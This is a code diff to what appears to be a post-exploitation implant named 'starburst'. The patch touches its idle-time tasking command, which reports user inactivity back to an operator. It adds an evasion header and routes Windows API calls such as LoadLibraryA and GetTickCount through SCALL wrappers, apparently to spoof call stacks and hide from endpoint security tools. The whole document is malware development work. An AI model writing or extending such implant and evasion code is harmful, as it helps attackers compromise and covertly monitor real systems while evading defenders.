@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_IDLETIME
 
@@ -28,7 +29,7 @@ auto declfn starburst::cmd_idletime(
     DBG_PRINT( inst, "cmd_idletime\n" );
 
     STK_USER32(_n);
-    auto h_user32 = inst.kernel32.LoadLibraryA( _n );
+    auto h_user32 = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n );
     if ( !h_user32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "failed to load user32.dll" ) ) );
@@ -48,13 +49,13 @@ auto declfn starburst::cmd_idletime(
     LASTINPUTINFO_T lii = {};
     lii.cbSize = sizeof( LASTINPUTINFO_T );
 
-    if ( !pGetLastInputInfo( &lii ) ) {
+    if ( !SCALL_PTR( inst, pGetLastInputInfo, &lii ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetLastInputInfo failed" ) ) );
         return;
     }
 
-    DWORD current_tick = inst.kernel32.GetTickCount();
+    DWORD current_tick = (DWORD)SCALL( inst, kernel32.GetTickCount );
     DWORD idle_ms = current_tick - lii.dwTime;
 
     uint32_t total_sec = idle_ms / 1000;
